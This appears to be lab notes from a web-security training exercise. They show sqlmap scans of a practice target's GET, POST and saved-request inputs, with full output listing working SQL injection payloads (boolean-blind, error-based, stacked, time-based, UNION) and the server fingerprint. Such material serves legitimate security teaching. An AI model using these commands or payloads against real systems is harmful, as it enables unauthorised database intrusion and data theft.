# HTTP Requests

## Copy as cURL

```sh
my@attack:~$ sudo sqlmap 'http://94.237.57.108:48194/' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Sec-GPC: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i'
```

## GET

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' --batch
```

```output title="Output" hl_lines="15 17 21 22 24 45 49 77"
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:47:02 /2025-04-25/

[16:47:02] [INFO] testing connection to the target URL
[16:47:02] [INFO] checking if the target is protected by some kind of WAF/IPS
[16:47:02] [INFO] testing if the target URL content is stable
[16:47:02] [INFO] target URL content is stable
[16:47:02] [INFO] testing if GET parameter 'id' is dynamic
[16:47:02] [INFO] GET parameter 'id' appears to be dynamic
[16:47:03] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[16:47:03] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[16:47:03] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[16:47:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:47:03] [WARNING] reflective value(s) found and filtering out
[16:47:03] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="1958")
[16:47:03] [INFO] testing 'Generic inline queries'
[16:47:03] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[16:47:04] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[16:47:04] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[16:47:04] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[16:47:04] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[16:47:04] [WARNING] potential permission problems detected ('command denied')
[16:47:04] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[16:47:04] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[16:47:04] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[16:47:04] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:47:04] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[16:47:04] [INFO] testing 'MySQL inline queries'
[16:47:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[16:47:05] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)
[16:47:16] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable
[16:47:16] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[16:47:27] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[16:47:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[16:47:27] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[16:47:27] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[16:47:28] [INFO] target URL appears to have 6 columns in query
[16:47:28] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 43 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1293=1293

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 9346 FROM(SELECT COUNT(*),CONCAT(0x716b766271,(SELECT (ELT(9346=9346,1))),0x7162706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3102 FROM (SELECT(SLEEP(5)))NWXN)

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x716b766271,0x4e6e6b464c4c4e45466842436c6b47765741746a4a454977664657635a6853574e6f586874556a75,0x7162706271),NULL,NULL,NULL,NULL-- -
---
[16:47:28] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[16:47:28] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/94.237.57.108'

[*] ending @ 16:47:28 /2025-04-25/
```

## POST

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case2.php' --data 'id=1' --batch
```

```output title="Output" hl_lines="15 17 21 22 24 45 49 77"
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.4#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:03:34 /2025-04-25/

[17:03:34] [INFO] testing connection to the target URL
[17:03:34] [INFO] checking if the target is protected by some kind of WAF/IPS
[17:03:34] [INFO] testing if the target URL content is stable
[17:03:35] [INFO] target URL content is stable
[17:03:35] [INFO] testing if POST parameter 'id' is dynamic
[17:03:35] [INFO] POST parameter 'id' appears to be dynamic
[17:03:35] [INFO] heuristic (basic) test shows that POST parameter 'id' might be injectable (possible DBMS: 'MySQL')
[17:03:35] [INFO] heuristic (XSS) test shows that POST parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[17:03:35] [INFO] testing for SQL injection on POST parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[17:03:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:03:35] [WARNING] reflective value(s) found and filtering out
[17:03:36] [INFO] POST parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Lane")
[17:03:36] [INFO] testing 'Generic inline queries'
[17:03:36] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[17:03:36] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[17:03:36] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[17:03:36] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[17:03:36] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[17:03:36] [WARNING] potential permission problems detected ('command denied')
[17:03:36] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[17:03:37] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[17:03:37] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[17:03:37] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:03:37] [INFO] POST parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[17:03:37] [INFO] testing 'MySQL inline queries'
[17:03:37] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[17:03:37] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)
[17:03:48] [INFO] POST parameter 'id' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable
[17:03:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[17:03:59] [INFO] POST parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[17:03:59] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:03:59] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[17:03:59] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[17:04:00] [INFO] target URL appears to have 9 columns in query
[17:04:00] [INFO] POST parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 6409=6409

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 7839 FROM(SELECT COUNT(*),CONCAT(0x716a6b7871,(SELECT (ELT(7839=7839,1))),0x717a706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 6609 FROM (SELECT(SLEEP(5)))NpVI)

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a6b7871,0x6a4b5a4d6b476150516164706c594c4174796a664849674c4c6d6e507655476a66784f7069636d76,0x717a706b71)-- -
---
[17:04:00] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[17:04:00] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/94.237.57.108'

[*] ending @ 17:04:00 /2025-04-25/
```

## Full HTTP Requests

```http title="request.txt" linenums="1" hl_lines="1"
GET /case1.php?id=* HTTP/1.1
Host: 94.237.57.108:48194
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.57.108:48194/case1.php
Sec-GPC: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

```sh
my@attack:~$ sudo sqlmap -r /root/request.txt --batch
```

```output title="Output" hl_lines="13 19 21 24 25 27 87 94 118"
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:25:38 /2025-04-25/

[17:25:38] [INFO] parsing HTTP request from '/root/request.txt'
custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[17:25:38] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[17:25:38] [INFO] testing connection to the target URL
[17:25:38] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
[17:25:38] [INFO] checking if the target is protected by some kind of WAF/IPS
[17:25:38] [INFO] testing if the target URL content is stable
[17:25:38] [INFO] target URL content is stable
[17:25:38] [INFO] testing if URI parameter '#1*' is dynamic
[17:25:39] [INFO] URI parameter '#1*' appears to be dynamic
[17:25:39] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'MySQL')
[17:25:39] [INFO] testing for SQL injection on URI parameter '#1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[17:25:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:25:39] [WARNING] reflective value(s) found and filtering out
[17:25:40] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[17:25:41] [INFO] testing 'Generic inline queries'
[17:25:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[17:25:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[17:25:48] [INFO] URI parameter '#1*' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string="26")
[17:25:48] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[17:25:48] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[17:25:48] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[17:25:48] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[17:25:48] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[17:25:48] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[17:25:49] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[17:25:49] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[17:25:49] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:25:49] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:25:49] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:25:49] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[17:25:49] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[17:25:49] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[17:25:49] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:25:49] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[17:25:50] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[17:25:50] [INFO] URI parameter '#1*' is 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)' injectable
[17:25:50] [INFO] testing 'MySQL inline queries'
[17:25:50] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[17:25:50] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[17:25:50] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[17:25:50] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[17:25:50] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[17:25:50] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[17:25:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[17:25:50] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[17:25:51] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[17:25:51] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[17:25:51] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[17:25:51] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[17:25:51] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[17:25:51] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[17:25:51] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[17:25:51] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[17:25:51] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[17:25:51] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[17:25:52] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
[17:25:52] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
[17:25:52] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
[17:25:52] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
[17:25:52] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[17:25:52] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[17:25:52] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[17:25:52] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[17:25:52] [INFO] testing 'MySQL AND time-based blind (ELT)'
[17:25:52] [INFO] testing 'MySQL OR time-based blind (ELT)'
[17:25:53] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[17:25:53] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[17:25:53] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[17:25:53] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[17:25:53] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[17:26:53] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 time-based blind - Parameter replace' injectable
[17:26:53] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:26:53] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[17:26:56] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[17:26:58] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[17:26:58] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[17:26:59] [INFO] target URL appears to have 6 columns in query
[17:27:00] [INFO] URI parameter '#1*' is 'MySQL UNION query (random number) - 1 to 20 columns' injectable
[17:27:00] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 193 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: http://94.237.57.108:48194/case1.php?id=-9277 OR 1858=1858#

    Type: error-based
    Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: http://94.237.57.108:48194/case1.php?id=-4463 OR 1 GROUP BY CONCAT(0x7170717171,(SELECT (CASE WHEN (3177=3177) THEN 1 ELSE 0 END)),0x7162707871,FLOOR(RAND(0)*2)) HAVING MIN(0)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
    Payload: http://94.237.57.108:48194/case1.php?id=(CASE WHEN (8190=8190) THEN SLEEP(5) ELSE 8190 END)

    Type: UNION query
    Title: MySQL UNION query (random number) - 6 columns
    Payload: http://94.237.57.108:48194/case1.php?id=-6955 UNION ALL SELECT 1561,1561,CONCAT(0x7170717171,0x78517a574d4e614c6657677449476d54586b624e476a61716b6979796262545a4b726464634e4957,0x7162707871),1561,1561,1561#
---
[17:27:00] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[17:27:00] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/94.237.57.108'

[*] ending @ 17:27:00 /2025-04-25/
```
